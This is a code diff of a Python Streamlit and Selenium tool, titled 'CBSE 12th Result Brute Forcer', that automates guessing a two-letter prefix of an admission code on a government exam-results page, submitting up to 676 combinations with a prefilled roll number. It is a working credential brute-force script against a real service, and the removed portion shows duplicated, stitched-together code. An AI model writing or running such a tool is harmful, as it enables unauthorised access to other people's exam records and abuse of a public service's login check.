@@ -16,14 +16,14 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    """Success = No visible error message in #err_msg"""
+    """Success if no visible error message"""
     try:
         error_elem = driver.find_element(By.ID, "err_msg")
         if error_elem.is_displayed() and error_elem.text.strip():
-            return False  # Error message is visible → failed
-        return True       # No error message → success
+            return False
+        return True
     except NoSuchElementException:
-        return True       # Error element not found → likely success
+        return True
     except:
         return False
 
@@ -37,7 +37,7 @@ def run_brute_force(roll_number, known_last_6, delay):
     try:
         driver = get_driver()
         driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
-        status.success("✅ Browser started. Starting brute force...")
+        status.success("Browser started. Starting brute force...")
 
         letters = string.ascii_uppercase
         count = 0
@@ -46,10 +46,9 @@ def run_brute_force(roll_number, known_last_6, delay):
             for b in letters:
                 code = f"{a}{b}{known_last_6}"
                 count += 1
-                progress.info(f"**Progress:** {count}/676 | Trying: **{a}{b}** → `{code}`")
+                progress.info(f"Progress: {count}/676 | Trying: {a}{b} -> {code}")
 
                 try:
-                    # Fill fields
                     driver.find_element(By.ID, "rroll").clear()
                     driver.find_element(By.ID, "rroll").send_keys(roll_number)
 
@@ -57,22 +56,21 @@ def run_brute_force(roll_number, known_last_6, delay):
                     driver.find_element(By.ID, "admn_id").send_keys(code)
 
                     driver.find_element(By.ID, "submit").click()
-                    
                     time.sleep(delay)
 
                     if is_success(driver):
                         result.success(f"""
-                        🎉 **SUCCESS FOUND!**
+SUCCESS FOUND!
 
-                        **Full Code:** `{code}`
-                        **Prefix:** `{a}{b}`
-                        """)
-                        st.balloons()
+Full Code: {code}
+Prefix: {a}{b}
+""")
+                        st.success("**Result Found!** Please check above.")
                         return
                 except:
                     continue
 
-        st.error("❌ Finished all 676 attempts. Code not found.")
+        st.error("Finished all 676 attempts. Code not found.")
 
     except Exception as e:
         st.error(f"Error: {str(e)}")
@@ -81,48 +79,15 @@ def run_brute_force(roll_number, known_last_6, delay):
             driver.quit()
 
 
-# ====================== UI ======================
-st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer")
-
-roll_number = st.text_input("Roll Number", value="18615900")
-known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 1.0, 6.0, 3.0, 0.5)
-
-if st.button("🚀 Start Brute Force", type="primary"):
-    if len(known_last_6) != 6:
-        st.error("Last 6 characters must be exactly 6.")
-    elif not roll_number:
-        st.error("Please enter Roll Number.")
-    else:
-        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)                        🎉 **SUCCESS FOUND!**
-
-                        **Full Code:** `{code}`
-                        **Prefix:** `{a}{b}`
-                        """)
-                        st.balloons()
-                        return
-                except:
-                    continue
-
-        st.error("❌ Finished all 676 attempts. Code not found.")
-
-    except Exception as e:
-        st.error(f"**Browser Error:** {str(e)}")
-    finally:
-        if driver:
-            driver.quit()
-
-
 # ====================== MAIN UI ======================
 st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer")
+st.title("CBSE 12th Result Brute Forcer")
 
 roll_number = st.text_input("Roll Number", value="18615900")
 known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 1.5, 5.0, 2.5)
+delay = st.slider("Delay between attempts (seconds)", 2.0, 6.0, 3.5, 0.5)
 
-if st.button("🚀 Start Brute Force", type="primary"):
+if st.button("Start Brute Force", type="primary"):
     if len(known_last_6) != 6:
         st.error("Last 6 characters must be exactly 6.")
     elif not roll_number:
